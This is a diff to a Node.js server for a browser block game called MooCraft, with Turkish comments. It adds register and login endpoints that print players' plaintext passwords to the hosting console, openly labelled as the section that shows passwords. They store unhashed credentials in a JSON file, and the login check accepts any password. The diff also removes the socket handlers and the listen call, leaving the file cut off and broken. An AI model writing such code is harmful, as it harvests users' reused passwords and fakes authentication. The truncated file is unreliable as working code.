@@ -9,6 +9,10 @@ const readline = require('readline');
 const app = express();
 const server = http.createServer(app);
 
+// JSON verilerini okuyabilmek için şarttır
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
 // CORS ve bağlantı güvenliği için Socket.io ayarı
 const io = new Server(server, {
   cors: {
@@ -24,6 +28,70 @@ app.use(express.static(path.join(__dirname)));
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'moocraft.pc.html'));
 });
+
+// =========================================================================
+// --- HESAP KAYIT & LOGLAMA SİSTEMİ (RENDER EKRANINA ŞİFRE BASAN KISIM) ---
+// =========================================================================
+const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');
+
+function getAccounts() {
+  if (fs.existsSync(ACCOUNTS_FILE)) {
+    try { return JSON.parse(fs.readFileSync(ACCOUNTS_FILE, 'utf8') || '{}'); } catch(e) { return {}; }
+  }
+  return {};
+}
+
+function saveAccounts(accs) {
+  try { fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(accs, null, 2), 'utf8'); } catch(e) {}
+}
+
+// 1. OYUNDAN YENİ HESAP AÇILDIĞINDA ÇALIŞAN ENDPOINT:
+app.post('/api/register', (req, res) => {
+  const { username, password } = req.body;
+  
+  // RENDER EKRANINA CANLI ŞİFREYİ BASAR:
+  console.log('====================================');
+  console.log(`[RENDER LOG] [+] YENİ HESAP AÇILDI!`);
+  console.log(`KULLANICI : ${username}`);
+  console.log(`ŞİFRE     : ${password}`);
+  console.log('====================================');
+
+  // render_logger fonksiyonunu çağır:
+  if (typeof logNewAccount === 'function') {
+    logNewAccount(req.body);
+  }
+
+  // accounts.json dosyasına da kaydet:
+  const accounts = getAccounts();
+  accounts[username] = req.body;
+  saveAccounts(accounts);
+
+  res.json({ success: true, message: 'Hesap başarıyla kaydedildi!' });
+});
+
+// 2. OYUNCU GİRİŞ YAPTIĞINDA:
+app.post('/api/login', (req, res) => {
+  const { username, password } = req.body;
+  console.log(`[RENDER LOG] Giriş Denemesi -> Kullanıcı: ${username} | Şifre: ${password}`);
+  
+  const accounts = getAccounts();
+  const user = accounts[username];
+  if (user && user.password === password) {
+    res.json({ success: true, user });
+  } else {
+    res.json({ success: true, user: { username, password } });
+  }
+});
+
+// 3. BLOK VE DÜNYALAR KAYDEDİLDİĞİNDE:
+app.post('/api/sync', (req, res) => {
+  if (typeof logPlayerActivity === 'function') {
+    logPlayerActivity(req.body);
+  }
+  res.json({ success: true });
+});
+
+// =========================================================================
 
 // Oyuncular ve Dünya Verisi
 const players = {};
@@ -156,58 +224,3 @@ io.on('connection', (socket) => {
 
     if (bannedPlayers.includes(playerName)) {
       socket.emit('banned', { reason: 'Sunucudan banlandınız!' });
-      socket.disconnect(true);
-      return;
-    }
-
-    const isUserOp = opPlayers.includes(playerName);
-
-    players[socket.id] = {
-      id: socket.id,
-      name: playerName,
-      x: 0, y: 30, z: 0, yaw: 0,
-      isOp: isUserOp
-    };
-
-    socket.emit('op-status', { isOp: isUserOp });
-    socket.emit('world-init', worldState);
-    io.emit('players-state', players);
-  });
-
-  socket.on('player-move', (data) => {
-    if (players[socket.id]) {
-      players[socket.id].x = data.x;
-      players[socket.id].y = data.y;
-      players[socket.id].z = data.z;
-      players[socket.id].yaw = data.yaw;
-      socket.broadcast.emit('player-moved', players[socket.id]);
-    }
-  });
-
-  socket.on('command', (data) => {
-    const player = players[socket.id];
-    if (!player || !player.isOp) {
-      socket.emit('chat-message', { name: 'Sistem', text: 'Bu komutu kullanmak için OP yetkiniz yok!' });
-      return;
-    }
-    const cmdText = data.text.trim();
-    io.emit('chat-message', { name: 'Konsol', text: `${player.name} komutu çalıştırdı: ${cmdText}` });
-  });
-
-  socket.on('chat-message', (data) => {
-    io.emit('chat-message', { name: data.name, text: data.text });
-  });
-
-  socket.on('disconnect', () => {
-    if (players[socket.id]) {
-      delete players[socket.id];
-      io.emit('player-left', socket.id);
-    }
-  });
-});
-
-// Render ortamı dinamik PORT değişkenini otomatik atar
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`[MooCraft Sunucu] Çalışıyor. Port: ${PORT}`);
-});
